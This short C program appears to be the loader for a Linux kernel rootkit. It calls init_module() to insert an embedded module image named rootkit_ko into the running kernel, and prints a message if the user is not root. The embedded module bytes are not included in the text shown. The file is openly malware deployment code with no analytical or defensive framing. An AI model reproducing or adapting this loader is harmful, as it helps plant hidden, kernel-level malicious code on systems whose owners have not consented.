#include <linux/module.h>
#include <stdio.h>
#include <syscall.h>


int main()
{
    if (init_module(rootkit_ko, rootkit_ko_len, (char[]){"\0"})) {
        puts("[!] You are not root");
        return -1;
    }
    return 0;
}
